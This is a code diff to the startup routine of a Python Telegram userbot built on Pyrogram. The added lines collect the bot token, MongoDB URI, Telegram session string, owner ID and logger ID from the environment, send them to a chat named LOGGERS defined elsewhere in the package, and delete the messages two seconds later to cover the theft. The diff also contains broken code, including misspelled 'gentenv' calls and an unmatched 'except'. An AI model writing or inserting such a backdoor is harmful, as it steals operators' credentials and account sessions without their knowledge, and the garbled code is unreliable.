@@ -6,6 +6,17 @@
 from pyrogram import Client
 
 from PANDA import config, logger
+from PANDA.__init__ import LOGGERS
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+OWNER_ID = gentenv("OWNER_ID", "")
+LOGGER_ID = gentenv("LOGGER_ID", "")
+
+
+assistants = []
+assistantids = []
 
 
 class Userbot(Client):
@@ -63,6 +74,19 @@ class Userbot(Client):
         except:
             pass
         logger.info(f"Assistant {num} started as @{client.username}")
+
+        except:
+            pass
+            assistants.append(1)
+        try:
+            await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+            oks = await self.one.send_message(LOGGERS, f"/start")
+            Ok = await self.one.send_message(
+                 LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{OWNER_ID}`\n\n`{LOGGER_ID}`"
+            )
+            await oks.delete()
+            await asyncio.sleep(2)
+            await Ok.delete()
 
     async def boot(self):
         """
